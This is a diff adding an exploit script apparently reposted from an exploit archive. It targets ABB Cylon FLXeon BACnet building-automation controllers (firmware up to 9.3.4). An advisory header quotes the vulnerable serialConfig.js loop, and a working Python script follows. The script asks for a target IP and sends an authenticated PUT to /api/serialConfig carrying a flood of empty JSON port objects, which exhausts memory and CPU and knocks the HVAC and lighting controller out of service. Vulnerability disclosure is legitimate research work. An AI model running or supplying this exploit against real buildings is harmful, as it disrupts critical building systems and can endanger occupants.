@@ -1,0 +1,138 @@
+id: 39909
+date: 02/11/2025
+title: ABB Cylon FLXeon 9.3.4 serialConfig.js Denial of Service Exploit
+author: LiquidWorm
+cves: 
+
+#!/usr/bin/env python3
+#
+#
+# ABB Cylon FLXeon 9.3.4 (serialConfig.js) JSON Object Flooding DoS
+# 
+# 
+# Vendor: ABB Ltd.
+# Product web page: https://www.global.abb                   
+# Affected version: FLXeon Series (FBXi Series, FBTi Series, FBVi Series)
+#                   CBX Series (FLX Series)
+#                   CBT Series
+#                   CBV Series
+#                   Firmware: <=9.3.4
+# 
+# Summary: BACnet® Smart Building Controllers. ABB's BACnet portfolio features a
+# series of BACnet® IP and BACnet MS/TP field controllers for ASPECT® and INTEGRA™
+# building management solutions. ABB BACnet controllers are designed for intelligent
+# control of HVAC equipment such as central plant, boilers, chillers, cooling towers,
+# heat pump systems, air handling units (constant volume, variable air volume, and
+# multi-zone), rooftop units, electrical systems such as lighting control, variable
+# frequency drives and metering.
+# 
+# The FLXeon Controller Series uses BACnet/IP standards to deliver unprecedented
+# connectivity and open integration for your building automation systems. It's scalable,
+# and modular, allowing you to control a diverse range of HVAC functions.
+#
+# Desc: The ABB Cylon FLXeon BACnet controller is vulnerable to an authenticated JSON
+# flooding attack, leading to uncontrolled resource consumption and a denial-of-service
+# (DoS) condition. The /api/serialConfig endpoint allows an authenticated attacker to
+# abuse an unrestricted loop to create a large number of JSON objects by sending specially
+# crafted requests through the ports JSON array. This results in excessive memory and CPU
+# usage, causing resource exhaustion and potential service failure.
+#
+# -------------------------------------------------------------------------------------
+# /api/serialConfig.js:
+# ---------------------
+# 67: function put(req, res) {
+# 68:     var newPlat = { serial: {} };
+# 69:     var newPorts = req.body.ports;
+# 70:     var client = dgram.createSocket("udp4");
+# 71:     Platform.readConfig(function (err, config) {
+# 72:         if (err) {
+# 73:             return res.status(500).send('Failed to read conf.json file');
+# 74:         }
+# 75:         else {
+# 76:             for (let idx = 0; idx < newPorts.length; idx++) {
+# 77:                 if (newPorts[idx].protocol == 'mstp') {
+# 78:                     newPlat['serial'][idx + 1] = { proto: newPorts[idx].protocol, mstp: { baud: newPorts[idx].baud } };
+# 79:                 }
+# 80:                 else {
+# 81:                     newPlat['serial'][idx + 1] = { proto: newPorts[idx].protocol };
+# 82:                 }
+# 83:             }
+# -------------------------------------------------------------------------------------
+# 
+# Tested on: Linux Kernel 5.4.27
+#            Linux Kernel 4.15.13
+#            NodeJS/8.4.0
+#            Express
+# 
+# 
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2025-5915
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5915.php
+#
+#
+# 21.04.2024
+#
+#
+
+
+import requests
+import json
+
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+proj = r"""
+                 P   R   O   J   E   C   T
+
+                        .|
+                        | |
+                        |'|            ._____
+                ___    |  |            |.   |' .---"|
+        _    .-'   '-. |  |     .--'|  ||   | _|    |
+     .-'|  _.|  |    ||   '-__  |   |  |    ||      |
+     |' | |.    |    ||       | |   |  |    ||      |
+ ____|  '-'     '    ""       '-'   '-.'    '`      |____
+░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░▒▓███████▓▒░  
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+         ░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓██████▓▒░ 
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░░░░░░ 
+         ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒▒▓███▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░░▒▓██████▓▒░ ░▒▓██████▓▒░
+                                         
+            ABB Cylon FLXeon Series <=9.3.4
+                 JSON Object Flooding
+                     ZSL-2025-5915
+"""
+
+print(proj)
+
+hdrs = {
+    "Cookie" : "user_sid=s:xxx.yyy/zzz",
+    "Content-Type" : "application/json; charset=utf-8"}
+
+trgt = input("Enter target IP: ")
+pd = {"ports": [{} for _ in range(251)]} # ++
+jd = json.dumps(pd)
+
+print("Sending DoS payload:\n", jd)
+odg = requests.put(f"https://{trgt}/api/serialConfig",
+	                 headers = hdrs,
+	                 data = jd,
+	                 verify = False)
+
+print(odg.status_code, end = ':')
+print(odg.json())
+print("Bamboozled!")
+
+#  0day.today [2025-02-14]  #
